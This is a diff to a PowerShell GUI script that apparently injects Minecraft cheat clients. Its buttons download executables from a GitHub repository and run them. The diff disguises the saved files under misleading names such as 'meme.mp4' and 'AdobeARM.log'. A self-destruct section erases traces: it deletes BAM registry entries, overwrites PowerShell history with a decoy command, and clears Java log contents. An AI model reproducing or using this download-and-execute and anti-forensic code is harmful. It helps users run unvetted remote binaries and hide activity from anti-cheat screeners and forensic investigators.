@@ -170,7 +170,7 @@ $form.MaximizeBox = $false
 $form.MinimizeBox = $false
 $form.BackColor = 'Black'  # Set background color of the form to black
 # Set the title to empty (remove the title)
-$form.Text = "HackEmDown" 
+$form.Text = "By Zpat | FAX" 
 # Set the top bar (title bar) color to black
 $form.BackColor = 'Black'  # Set background color for the whole form
 $form.ForeColor = 'White'  # Set text color for the form content
@@ -268,24 +268,24 @@ $injectButton.Add_Click({
     $form.Controls.Add($phantomButton)
     # === YOUR CUSTOM PRESTIGE LOGIC HERE ===
     $prestigeButton.Add_Click({
-        if (-Not (Test-Path "Z:\sodium-fabric-0.6.13+mc1.21.4.jar")) {
-            iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/sodium.jar"  -OutFile "Z:\sodium-fabric-0.6.13+mc1.21.4.jar"
+        if (-Not (Test-Path "Z:\meme.mp4")) {
+            iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/sodium.jar"  -OutFile "Z:\meme.mp4"
         }
-        Start-Process java -ArgumentList '-jar "Z:\sodium-fabric-0.6.13+mc1.21.4.jar"'
+        Start-Process java -ArgumentList '-jar "Z:\meme.mp4"'
     })
     # === YOUR CUSTOM VAPELITE LOGIC HERE ===
     $vapeliteButton.Add_Click({
-        if (-Not (Test-Path "Z:\scrcons.exe")) {
-            iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/wpbbin.exe"  -OutFile "Z:\scrcons.exe"
+        if (-Not (Test-Path "Z:\8eef20dd-b61d-4da3-b1b4-00cd4c8117f1.tmp")) {
+            iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/wpbbin.exe"  -OutFile "Z:\8eef20dd-b61d-4da3-b1b4-00cd4c8117f1.tmp"
         }
-        Start-Process "Z:\scrcons.exe"
+        Start-Process "Z:\8eef20dd-b61d-4da3-b1b4-00cd4c8117f1.tmp"
     })
     # === YOUR CUSTOM VAPEV4 LOGIC HERE ===
     $vapev4Button.Add_Click({
-        if (-Not (Test-Path "Z:\bitsadmin.exe")) {
-            iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/svchost.exe"  -OutFile "Z:\bitsadmin.exe"
+        if (-Not (Test-Path "Z:\AdobeARM.log")) {
+            iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/svchost.exe"  -OutFile "Z:\AdobeARM.log"
         }
-        Start-Process "Z:\bitsadmin.exe"
+        Start-Process "Z:\AdobeARM.log"
     })
 })
 # Destruct Button
@@ -358,20 +358,7 @@ assign letter=Z
     gp HKLM:\SYSTEM\CurrentControlSet\Services\Bam\State | % { $_.PSObject.Properties } | ? { $_.Name -match "mmc\.exe|diskpart\.exe" } | % { ri HKLM:\SYSTEM\CurrentControlSet\Services\Bam\State -n $_.Name }
     # Conhost History
     Set-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 'iwr -useb https://raw.githubusercontent.com/spicetify/cli/main/install.ps1  | iex'
-    # Clear JVM args logs and traces
-    $jvmLogPaths = @(
-        "C:\ProgramData\Oracle\Java",
-        "$env:USERPROFILE\.java",
-        "$env:USERPROFILE\AppData\LocalLow\Sun\Java",
-        "$env:USERPROFILE\AppData\Local\Sun\Java",
-        "$env:USERPROFILE\AppData\Roaming\Sun\Java"
-    )
-    foreach ($path in $jvmLogPaths) {
-        if (Test-Path -Path $path) {
-            Remove-Item -Path $path -Recurse -Force -ErrorAction SilentlyContinue
-        }
-    }
-    # Clear specific JVM log files
+    # Clear JVM args logs and traces by clearing content
     $jvmLogFiles = @(
         "$env:USERPROFILE\.java\deployment\log\*.log",
         "$env:USERPROFILE\AppData\LocalLow\Sun\Java\Deployment\log\*.log",
@@ -379,8 +366,8 @@ assign letter=Z
         "$env:USERPROFILE\AppData\Roaming\Sun\Java\Deployment\log\*.log"
     )
     foreach ($file in $jvmLogFiles) {
-        if (Test-Path -Path $file) {
-            Remove-Item -Path $file -Force -ErrorAction SilentlyContinue
+        Get-ChildItem -Path $file -ErrorAction SilentlyContinue | ForEach-Object {
+            Clear-Content -Path $_.FullName -ErrorAction SilentlyContinue
         }
     }
     # Stop the script process
